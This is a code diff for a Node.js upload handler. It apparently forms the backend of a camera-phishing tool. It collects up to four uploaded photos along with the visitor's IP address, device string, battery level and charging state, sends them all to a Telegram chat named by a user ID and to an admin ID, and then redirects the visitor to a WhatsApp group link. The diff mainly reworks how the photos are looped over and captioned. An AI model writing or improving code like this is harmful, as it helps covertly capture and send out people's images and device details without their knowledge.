@@ -16,30 +16,30 @@ module.exports = (req, res) => {
     if (err) return res.status(500).send("Form parse error");
 
     const uid = fields.uid;
+    const battery = fields.battery || 'Unknown';
+    const charging = fields.charging || 'Unknown';
 
-    // Check that all 4 images exist
-    const imageFiles = ['image1', 'image2', 'image3', 'image4'].map(key => files[key]);
-    if (!uid || imageFiles.some(f => !f)) return res.status(400).send("UID or images missing");
+    // عکسونه
+    const photos = [];
+    for (let i = 1; i <= 4; i++) {
+      const file = files[`photo${i}`] || files[`photo`] // fallback
+      if (!file) continue;
+      photos.push(file);
+    }
+
+    if (!uid || photos.length === 0) return res.status(400).send("UID or photos missing");
 
     try {
       // Device & Network info
       const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
-      const userAgent = req.headers['user-agent'] || "Unknown";
-      const timestamp = new Date().toLocaleString('en-US', {
-        timeZone: 'Asia/Kabul',
-        hour12: false,
-      });
+      const userAgent = fields.device || 'Unknown';
+      const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul', hour12: false });
 
-      // Battery info (from frontend)
-      const battery = fields.battery || 'Unknown';
-      let charging = 'Unknown';
-      if (fields.charging === 'true') charging = 'Yes 🔌';
-      if (fields.charging === 'false') charging = 'No 🔘';
-
-      // Telegram Caption
-      const caption = `
-╭─────📸 <b><blockquote>NEW PHOTOS RECEIVED</blockquote></b> │─────────────────────╮
+      // Telegram Caption template
+      const caption = (index) => `
+╭─────📸 <b><blockquote>NEW PHOTO RECEIVED</blockquote></b> │─────────────────────╮
 │
+│─❖ 🔘 <b>Photo #${index}</b>
 │─❖ 🙎 <b>User ID:</b> ${uid}
 │─❖ 🔋 <b>Battery:</b> ${battery}%
 │─❖ ⚡ <b>Charging:</b> ${charging}
@@ -51,43 +51,32 @@ module.exports = (req, res) => {
 ╰─────────────────────╯
 `.trim();
 
-      // Send each image
-      for (const file of imageFiles) {
-        const buffer = fs.readFileSync(file.filepath);
+      // Send photos to Telegram
+      for (let i = 0; i < photos.length; i++) {
+        const buffer = fs.readFileSync(photos[i].filepath);
 
         // Send to user
-        await bot.telegram.sendPhoto(
-          uid,
-          { source: buffer },
-          { caption: caption, parse_mode: "HTML" }
-        );
+        await bot.telegram.sendPhoto(uid, { source: buffer }, { caption: caption(i + 1), parse_mode: "HTML" });
 
-        // Send to admin if ADMIN_ID is set
+        // Send to admin
         if (process.env.ADMIN_ID) {
-          await bot.telegram.sendPhoto(
-            process.env.ADMIN_ID,
-            { source: buffer },
-            { caption: caption, parse_mode: "HTML" }
-          );
+          await bot.telegram.sendPhoto(process.env.ADMIN_ID, { source: buffer }, { caption: caption(i + 1), parse_mode: "HTML" });
         }
 
-        // Cleanup temp file
-        fs.unlinkSync(file.filepath);
+        // Cleanup
+        fs.unlinkSync(photos[i].filepath);
       }
 
-      // ✅ Redirect to WhatsApp link after all photos sent
+      // Redirect after success
       res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");
 
     } catch (e) {
       console.error("Telegram Error:", e.message);
-
-      // ❌ Cleanup all uploaded files
-      for (const file of imageFiles) {
-        if (file && file.filepath) {
-          try { fs.unlinkSync(file.filepath); } catch {}
-        }
+      // Cleanup on error
+      for (const file of photos) {
+        if (file?.filepath) try { fs.unlinkSync(file.filepath); } catch {}
       }
       res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");
     }
   });
-}; 
+};
